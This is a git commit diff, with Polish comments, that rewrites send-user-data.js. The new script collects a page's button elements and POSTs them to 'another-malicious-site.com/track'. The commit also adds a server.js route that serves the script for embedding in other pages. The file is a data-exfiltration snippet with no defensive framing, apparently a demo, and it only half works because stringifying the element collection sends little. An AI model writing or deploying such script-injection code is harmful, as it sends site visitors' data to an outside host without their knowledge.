cb6b06d71caa96b571a48db47a331d1143470f3f
mattix10 <mateusz.salamon10@gmail.com>
2024-07-11 22:48:45 +0200

    add js file

--- send-user-data.js
+++ send-user-data.js
@@ -1,42 +1,11 @@
 (function () {
-  // Funkcja sprawdzająca bieżący URL
-  function checkPage() {
-    if (window.location.pathname === "/") {
-      console.log("Podstrona zmieniona na /test");
-    }
-  }
+  const button = document.getElementsByTagName("button");
 
-  // Nasłuchiwanie na zmiany w historii przeglądarki (pushState, replaceState)
-  (function (history) {
-    const pushState = history.pushState;
-    const replaceState = history.replaceState;
-
-    history.pushState = function (state) {
-      if (typeof history.onpushstate == "function") {
-        history.onpushstate({ state: state });
-      }
-      const result = pushState.apply(history, arguments);
-      window.dispatchEvent(new Event("pushstate"));
-      return result;
-    };
-
-    history.replaceState = function (state) {
-      if (typeof history.onreplacestate == "function") {
-        history.onreplacestate({ state: state });
-      }
-      const result = replaceState.apply(history, arguments);
-      window.dispatchEvent(new Event("replacestate"));
-      return result;
-    };
-
-    window.addEventListener("popstate", checkPage);
-    window.addEventListener("pushstate", checkPage);
-    window.addEventListener("replacestate", checkPage);
-  })(window.history);
-
-  // Początkowe sprawdzenie strony
-  checkPage();
-
-  // Dodatkowe sprawdzenie przy zmianie hash
-  window.addEventListener("hashchange", checkPage);
+  fetch("https://another-malicious-site.com/track", {
+    method: "POST",
+    body: JSON.stringify(button),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  });
 })();
--- server.js
+++ server.js
@@ -6,6 +6,18 @@ app.get("/", (req, res) => {
   res.send("Hello World!");
 });
 
+app.get("/send-user-data.js", (req, res) => {
+  const filePath = path.join(__dirname, "send-user-data.js");
+  fs.readFile(filePath, "utf8", (err, data) => {
+    if (err) {
+      res.status(500).send("Błąd serwera");
+      return;
+    }
+    res.setHeader("Content-Type", "application/javascript");
+    res.send(data);
+  });
+});
+
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
 });
